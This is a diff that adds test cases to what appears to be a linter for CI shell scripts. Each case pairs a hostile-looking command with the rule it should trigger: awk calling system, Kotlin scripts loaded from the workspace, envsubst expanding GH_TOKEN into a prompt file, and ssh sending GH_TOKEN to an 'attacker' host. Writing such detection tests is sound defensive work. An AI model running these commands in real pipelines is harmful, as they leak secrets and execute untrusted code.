@@ -243,3 +243,14 @@ t gawk-W 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${
 t gawk-profile-out 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk -o\${SCRIPT_DIR}/x 'BEGIN{}'"
 t jq-runtests 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}jq --run-tests \"\${GITHUB_WORKSPACE}/evil.jq\""
 t jq-indent 1 "helper-jq-env" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}jq --indent 4 '\$ENV.HOME'"
+
+# --- round 16: awk gaps (cursor), kotlin/envsubst/sshpass (Codex P1s) ---
+t awk-e-separate 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk 'BEGIN{}' -e 'system(\"id\")'"
+t profile-bare 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk --profile 'BEGIN{}'"
+t dump-short-bare 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk -d 'BEGIN{}'"
+t dump-short-attached 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk -d\${SCRIPT_DIR}/x 'BEGIN{}'"
+t kotlinc-script 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}kotlinc -script \"\${GITHUB_WORKSPACE}/evil.kts\""
+t kotlin-run 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}kotlin \"\${GITHUB_WORKSPACE}/evil.kts\""
+t envsubst-prompt 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}envsubst '\$GH_TOKEN' <<< '\$GH_TOKEN' >> \"\${prompt_file}\""
+t sshpass-wrap 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sshpass -p password ssh -o SendEnv=GH_TOKEN user@attacker"
+t ssh-askpass-env 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}SSH_ASKPASS=/evil ssh x"
